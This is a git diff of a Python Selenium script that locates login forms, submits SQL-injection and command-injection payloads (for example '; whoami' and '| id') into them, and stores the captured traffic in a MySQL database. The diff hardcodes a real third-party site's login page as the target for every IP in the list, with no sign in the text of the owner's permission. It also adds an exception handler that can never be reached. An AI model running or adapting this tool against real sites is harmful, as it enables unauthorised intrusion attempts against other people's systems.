@@ -11,7 +11,7 @@ import mysql.connector
 from urllib.parse import urlparse
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import TimeoutException
+from selenium.common.exceptions import TimeoutException, StaleElementReferenceException
 #Load Credentials from .env 
 load_dotenv()
 
@@ -23,7 +23,7 @@ db_connection = mysql.connector.connect(
     host='127.0.0.1',
     user='root',
     password=os.getenv('MYSQL_PASSWORD'),
-    database='pes'
+    database='honeypotdb'
 )
 
 #Create a cursor object using the cursor() method
@@ -56,7 +56,8 @@ def find_login_elements(driver):
         {'username': (By.XPATH, '//input[@name="username"]'), 'password': (By.XPATH, '//input[@name="password"]')},
         {'username': (By.XPATH, '//input[@placeholder="Enter your username"]'), 'password': (By.XPATH, '//input[@type="password"]')},
         {'username': (By.XPATH, '//input[@placeholder="username"]'), 'password': (By.XPATH, '//input[@placeholder="password"]')},
-        {'username': (By.XPATH, '//input[@placeholder="Username"]'), 'password': (By.XPATH, '//input[@placeholder="Password"]')}
+        {'username': (By.XPATH, '//input[@placeholder="Username"]'), 'password': (By.XPATH, '//input[@placeholder="Password"]')},
+        {'username': (By.XPATH, '//input[@placeholder="Email"]'), 'password': (By.XPATH, '//input[@placeholder="Password"]')}
     ]
 
     # Try each locator set
@@ -117,9 +118,8 @@ def save_to_db(req_method, req_path, req_headers, req_body, res_status, res_head
 
      # Check if response already exists
         c_rsp.execute('SELECT res_id FROM http_response WHERE status = %s AND headers = %s AND body = %s', 
-                      (res_status, res_headers, res_body))
+                    (res_status, res_headers, res_body))
         result = c_rsp.fetchall()
-
         if result:
             res_id = result[0][0]
         else:
@@ -206,9 +206,9 @@ def capture_network_traffic(driver):
         res_status = data['response']['status']
         res_headers = data['response']['headers']
         res_body = data['response']['body']
-        
-        # Save to database
-        save_to_db(req_method, req_path, req_headers, req_body, res_status, res_headers, res_body)
+        if res_body is not None and res_body != '' and res_status is not None:
+            # Save to database
+            save_to_db(req_method, req_path, req_headers, req_body, res_status, res_headers, res_body)
 
 
 
@@ -255,12 +255,8 @@ sql_injection_payloads = [
 
 command_injection_payloads = [
     "; ls",
-    "| ls",
     "; whoami",
-    "| whoami",
     "; uname -a",
-    "| uname -a",
-    "; id",
     "| id"
 ]
 
@@ -268,9 +264,8 @@ command_injection_payloads = [
 attack_payloads = sql_injection_payloads + command_injection_payloads
 
 
-
 def process_ip(ip):
-    target_url = f"http://{ip}"
+    target_url = f"https://photobucket.com/auth/login"
     print(f"Visiting: {target_url}")
 
     # Initialize a new WebDriver instance (new browser window) for each IP
@@ -314,7 +309,14 @@ def process_ip(ip):
         print(f"Timed out after 10 seconds for {target_url}")
     except Exception as e:
         print(f"Failed to load {target_url}: {e}")
-    
+    except StaleElementReferenceException:
+        driver.refresh()
+        # Re-locate elements and retry the operation
+        login_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable(
+                        (By.XPATH, '//input[@type="submit" or @value="Login" or @value="Sign In"] | '
+                                   '//button[@type="submit" or contains(text(), "Sign In") or contains(text(), "Login")]')
+                    ))
+        login_button.click()
     finally:
         driver.quit()  # Close the browser window
 
@@ -322,6 +324,10 @@ def process_ip(ip):
 for ip in ip_list:
     process_ip(ip)
     time.sleep(20)
+
+
+
+    
 '''
 for ip in ip_list:
     target_url = f"http://{ip}"  # Access each IP over HTTP
